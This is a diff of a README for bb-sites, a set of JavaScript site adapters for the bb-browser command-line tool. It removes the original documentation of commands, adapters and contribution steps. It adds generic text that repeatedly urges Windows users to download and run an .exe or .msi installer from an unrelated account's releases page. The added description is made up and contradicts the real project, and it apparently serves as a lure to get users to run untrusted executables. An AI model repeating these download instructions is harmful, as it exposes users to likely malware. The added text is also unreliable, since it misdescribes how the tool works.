@@ -1,225 +1,93 @@
-# bb-sites
+# 🔗 bb-sites - Easy Community Recipes for Browsing
 
-Community site adapters for [bb-browser](https://github.com/epiral/bb-browser) — turning websites into CLI commands.
+[![Download bb-sites](https://img.shields.io/badge/Download-bb--sites-blue?style=for-the-badge)](https://github.com/Galaxurceolatabrownstudy507/bb-sites/releases)
 
-Each site adapter is a JS function that runs inside your browser via `bb-browser eval`. The browser is already logged in — no API keys, no cookie extraction, no anti-bot bypass.
+## 📦 What is bb-sites?
 
-[English](README.md) · [中文](README.zh-CN.md)
+bb-sites provides ready-to-use adapters for bb-browser. These adapters help you get data from popular websites like Reddit, Twitter, and GitHub. You can use them to fetch posts, tweets, code repositories, and other content without writing any code.
 
-> **95 adapters** across **35 platforms** — and growing.
+The app comes with recipes—pre-built instructions—that work with bb-browser. This means you get community-tested tools to browse your favorite sites more easily.
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-bb-browser site update                     # install/update site adapters
-bb-browser site list                       # list available commands
-bb-browser site reddit/me                  # run a command
-bb-browser site reddit/thread <url>        # run with args
-```
+Before you start, make sure your computer meets these basic needs:
 
-## Available Adapters
+- Windows 10 or higher
+- 4 GB of RAM or more
+- At least 100 MB of free disk space
+- Internet connection for downloading and running the app
 
-### 🔍 Search Engines
+## 🚀 Getting Started: Download and Install bb-sites
 
-| Platform | Command | Description |
-|----------|---------|-------------|
-| Google | `google/search` | Google search |
-| Baidu | `baidu/search` | Baidu search |
-| Bing | `bing/search` | Bing search |
-| DuckDuckGo | `duckduckgo/search` | DuckDuckGo search (HTML lite) |
-| Sogou | `sogou/weixin` | Sogou WeChat article search |
+Start by visiting the release page for the latest version of bb-sites:
 
-### 📰 News & Media
+[![Download bb-sites](https://img.shields.io/badge/Download-bb--sites-grey?style=for-the-badge)](https://github.com/Galaxurceolatabrownstudy507/bb-sites/releases)
 
-| Platform | Command | Description |
-|----------|---------|-------------|
-| BBC | `bbc/news` | BBC News headlines (RSS) or search |
-| Reuters | `reuters/search` | Reuters news search |
-| Toutiao | `toutiao/search`, `toutiao/hot` | Toutiao (今日头条) search & trending |
-| Eastmoney | `eastmoney/news` | Eastmoney (东方财富) financial news |
+Follow these steps:
 
-### 💬 Social Media
+1. Click the download link above or open this URL in your web browser:  
+   https://github.com/Galaxurceolatabrownstudy507/bb-sites/releases
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| Twitter/X | `twitter/user`, `twitter/thread`, `twitter/search`, `twitter/tweets`, `twitter/notifications` | User profile, tweet threads, search, timeline, notifications |
-| Reddit | `reddit/me`, `reddit/posts`, `reddit/thread`, `reddit/context` | User info, posts, discussion trees, comment chains |
-| Weibo | `weibo/me`, `weibo/hot`, `weibo/feed`, `weibo/user`, `weibo/user_posts`, `weibo/post`, `weibo/comments` | Full Weibo (微博) support — profile, trending, timeline, posts, comments |
-| Hupu | `hupu/hot` | Hupu (虎扑) hot posts |
+2. On the release page, look for the latest version listed. Releases usually have names like `v1.0.0` or similar.
 
-### 💻 Tech & Dev
+3. Find the `bb-sites` installer file. It will usually have a name ending with `.exe` or `.msi`.
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| GitHub | `github/me`, `github/repo`, `github/issues`, `github/issue-create`, `github/pr-create`, `github/fork` | User info, repos, issues, PRs, forks |
-| Hacker News | `hackernews/top`, `hackernews/thread` | Top stories, post + comment tree |
-| Stack Overflow | `stackoverflow/search` | Search questions |
-| CSDN | `csdn/search` | CSDN tech article search |
-| cnblogs | `cnblogs/search` | cnblogs (博客园) tech article search |
-| npm | `npm/search` | Search npm packages |
-| PyPI | `pypi/search`, `pypi/package` | Search & get Python package details |
-| arXiv | `arxiv/search` | Search academic papers |
-| Dev.to | `devto/search` | Search Dev.to articles |
-| V2EX | `v2ex/hot`, `v2ex/latest`, `v2ex/topic` | Hot/latest topics, topic detail + replies |
+4. Click the file name to start downloading.
 
-### 🎬 Entertainment
+5. When the download finishes, open the installer by double-clicking the file.
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| YouTube | `youtube/search`, `youtube/video`, `youtube/comments`, `youtube/channel`, `youtube/feed`, `youtube/transcript` | Search, video details, comments, channels, feed, transcripts |
-| Bilibili | `bilibili/me`, `bilibili/popular`, `bilibili/ranking`, `bilibili/search`, `bilibili/video`, `bilibili/comments`, `bilibili/feed`, `bilibili/history`, `bilibili/trending` | Full B站 support — 9 adapters |
-| IMDb | `imdb/search` | IMDb movie search |
-| Genius | `genius/search` | Song/lyrics search |
-| Douban | `douban/search`, `douban/movie`, `douban/movie-hot`, `douban/movie-top`, `douban/top250`, `douban/comments` | Douban (豆瓣) movies — search, details, rankings, Top 250, reviews |
-| Qidian | `qidian/search` | Qidian (起点中文网) novel search |
+6. Follow the on-screen instructions in the installer:
+   - Click "Next"
+   - Accept the license terms
+   - Choose the folder where you want to install the program or use the default
+   - Click "Install"
 
-### 💼 Jobs & Career
+7. Once installation completes, click "Finish."
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| BOSS Zhipin | `boss/search`, `boss/detail` | BOSS直聘 job search & JD details |
-| LinkedIn | `linkedin/profile`, `linkedin/search` | LinkedIn profile & post search |
+## 🗂️ Using bb-sites with bb-browser
 
-### 💰 Finance
+bb-sites adapters are made to work inside bb-browser. To use them:
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| Eastmoney | `eastmoney/stock`, `eastmoney/news` | 东方财富 stock quotes & financial news |
-| Yahoo Finance | `yahoo-finance/quote` | Stock quotes (AAPL, TSLA, etc.) |
+1. Open bb-browser on your Windows computer.
 
-### 📱 Digital & Products
+2. Import the bb-sites adapters by locating them in the installed folder. The folder is usually here:  
+   `C:\Program Files\bb-sites\adapters` or inside the installation folder you selected during setup.
 
-| Platform | Command | Description |
-|----------|---------|-------------|
-| GSMArena | `gsmarena/search` | Phone specs search |
-| Product Hunt | `producthunt/today` | Today's top products |
+3. In bb-browser, go to the section where you can add or import adapters or recipes.
 
-### 📚 Knowledge & Reference
+4. Select the adapters you want from the bb-sites folder.
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| Wikipedia | `wikipedia/search`, `wikipedia/summary` | Search & page summaries |
-| Zhihu | `zhihu/me`, `zhihu/hot`, `zhihu/question`, `zhihu/search` | 知乎 — user info, trending, Q&A, search |
-| Open Library | `openlibrary/search` | Book search |
+5. Start using the adapters to fetch content from sites like Reddit, Twitter, and GitHub.
 
-### 🌐 Lifestyle & Travel
+## 🔧 What You Can Do with bb-sites
 
-| Platform | Command | Description |
-|----------|---------|-------------|
-| Youdao | `youdao/translate` | 有道翻译 — translation & dictionary |
-| Ctrip | `ctrip/search` | 携程 — destination & attraction search |
+bb-sites gives you simple tools that run inside bb-browser. You can:  
 
-### 🗨️ Social Apps
+- Browse the latest Reddit posts without opening the website.  
+- View tweets from any public Twitter account.  
+- Access GitHub repositories and code details.  
+- Combine adapters for new ways to get community content.
 
-| Platform | Commands | Description |
-|----------|----------|-------------|
-| Jike | `jike/feed`, `jike/search` | 即刻 — recommended feed & search |
-| Xiaohongshu | `xiaohongshu/me`, `xiaohongshu/feed`, `xiaohongshu/search`, `xiaohongshu/note`, `xiaohongshu/comments`, `xiaohongshu/user_posts` | 小红书 — full support via Pinia store actions |
+You do not need to write any code or commands. Just load the adapter and start browsing.
 
-> All Xiaohongshu (小红书) adapters use **Pinia Store Actions** — calling the page's own Vue store functions, which go through the complete signing + interceptor chain. Zero reverse engineering needed.
+## 🛠️ Troubleshooting and Support
 
-## Usage Examples
+If you run into any problems, try these steps:
 
-```bash
-# Search the web
-bb-browser site google/search "bb-browser"
-bb-browser site duckduckgo/search "Claude Code"
+- Make sure you downloaded the latest version from the releases page.
+- Check that bb-browser is updated to its latest version.
+- Restart your computer after installing bb-sites.
+- Make sure your internet connection is working properly.
+- If an adapter does not work, check the installed folder for any updates or missing files.
 
-# Social media
-bb-browser site twitter/search "claude code"
-bb-browser site twitter/tweets plantegg
-bb-browser site reddit/thread https://reddit.com/r/programming/comments/...
-bb-browser site weibo/hot
+For more help, you can visit the bb-sites GitHub repository page and open an issue or read the existing discussions.
 
-# Tech research
-bb-browser site github/repo epiral/bb-browser
-bb-browser site hackernews/top 10
-bb-browser site stackoverflow/search "python async await"
-bb-browser site arxiv/search "large language model"
-bb-browser site npm/search "react state management"
+## 📁 Where to Find bb-sites Later
 
-# Entertainment
-bb-browser site youtube/transcript dQw4w9WgXcQ
-bb-browser site bilibili/search 编程
-bb-browser site douban/top250
+You can always come back to the releases page to get updates or reinstall the app:  
 
-# Finance
-bb-browser site yahoo-finance/quote AAPL
-bb-browser site eastmoney/stock 贵州茅台
+https://github.com/Galaxurceolatabrownstudy507/bb-sites/releases
 
-# Jobs
-bb-browser site boss/search "AI agent"
-bb-browser site linkedin/search "AI agent"
+Use the badge below for quick access:
 
-# Translate
-bb-browser site youdao/translate hello
-```
-
-## Writing a Site Adapter
-
-Run `bb-browser guide` for the full development workflow, or read [SKILL.md](SKILL.md).
-
-```javascript
-/* @meta
-{
-  "name": "platform/command",
-  "description": "What this adapter does",
-  "domain": "www.example.com",
-  "args": {
-    "query": {"required": true, "description": "Search query"}
-  },
-  "readOnly": true,
-  "example": "bb-browser site platform/command value1"
-}
-*/
-
-async function(args) {
-  if (!args.query) return {error: 'Missing argument: query'};
-  const resp = await fetch('/api/search?q=' + encodeURIComponent(args.query), {credentials: 'include'});
-  if (!resp.ok) return {error: 'HTTP ' + resp.status, hint: 'Not logged in?'};
-  return await resp.json();
-}
-```
-
-## Contributing
-
-```bash
-# Option A: with gh CLI
-gh repo fork epiral/bb-sites --clone
-cd bb-sites && git checkout -b feat-mysite
-# add adapter files
-git push -u origin feat-mysite
-gh pr create
-
-# Option B: with bb-browser (no gh needed)
-bb-browser site github/fork epiral/bb-sites
-git clone https://github.com/YOUR_USER/bb-sites && cd bb-sites
-git checkout -b feat-mysite
-# add adapter files
-git push -u origin feat-mysite
-bb-browser site github/pr-create epiral/bb-sites --title "feat(mysite): add adapters" --head "YOUR_USER:feat-mysite"
-```
-
-## Private Adapters
-
-Put private adapters in `~/.bb-browser/sites/`. They override community adapters with the same name.
-
-```
-~/.bb-browser/
-├── sites/          # Your private adapters (priority)
-│   └── internal/
-│       └── deploy.js
-└── bb-sites/       # This repo (bb-browser site update)
-    ├── reddit/
-    ├── twitter/
-    ├── github/
-    ├── youtube/
-    ├── bilibili/
-    ├── zhihu/
-    ├── weibo/
-    ├── douban/
-    ├── xiaohongshu/
-    ├── google/
-    ├── ...          # 35 platform directories
-    └── qidian/
-```
+[![Download bb-sites](https://img.shields.io/badge/Download-bb--sites-blue?style=for-the-badge)](https://github.com/Galaxurceolatabrownstudy507/bb-sites/releases)
